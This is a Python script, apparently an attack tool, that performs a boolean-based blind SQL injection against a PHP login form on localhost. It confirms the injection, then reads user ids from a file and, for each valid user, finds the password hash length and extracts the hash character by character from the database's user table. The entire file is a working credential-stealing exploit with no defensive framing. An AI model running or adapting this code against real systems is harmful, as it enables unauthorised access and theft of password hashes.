import requests
import sys
total_queries = 0
charset       = "0123456789abcdef"
target        = "http://localhost:80/app/endpoint/login.php"
needle        = "Dashboard"

def injected_query(payload):
    global total_queries
    r = requests.post(target, data={"username": "admin' and {} #".format(payload), "password":"password"})
    total_queries += 1   
    return needle.encode() in r.content

def boolean_query(offeset, user_id, character, operator='='):
    payload="(select hex(substr(password, {}, 1)) from tbl_user where tbl_user_id = {}) {} hex ('{}')".format(offeset+1, user_id, operator, character)
    return injected_query(payload)

def is_valid_user(user_id):
    payload="(select tbl_user_id from tbl_user where tbl_user_id = {} )".format(user_id)
    return injected_query(payload)

def pass_hash_length(user_id):
    guess = 0
    while True:
        payload = "(select length(password) from tbl_user where tbl_user_id = {} and length(password) <= {} limit 1)".format(user_id, guess)
        if  injected_query(payload):
            return guess
        guess += 1

def extract_hash(charset, user_id, pass_hash):
    found = ""
    for i in range(pass_hash):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

def total_queries_performed():
    global total_queries
    print("\t\t[!] {} total queries !".format(total_queries))
    total_queries = 0

try:
    if injected_query("1 = 1"):
            print("\t[!] SQL injection detected")
    else:
            print("\t[X] SQL injection not detected")
            sys.exit()
except KeyboardInterrupt:
        print("exisitng the task succesfully")
with open("id.txt", "r") as ids:
    for myid in ids:
        try:
            user_id = myid
            if  is_valid_user(user_id):
                hash_length = pass_hash_length(user_id)
                print("\t[-] user: {} hash length: {}\n".format(user_id, hash_length))
                total_queries_performed()
                print("\t[-] user: {} hash: {}".format(user_id, extract_hash(charset, int(user_id), hash_length)))
            else:
                print("\t[X] user dosn't exsit.")
        except KeyboardInterrupt:
            print("exisitng the task succesfully")
            break
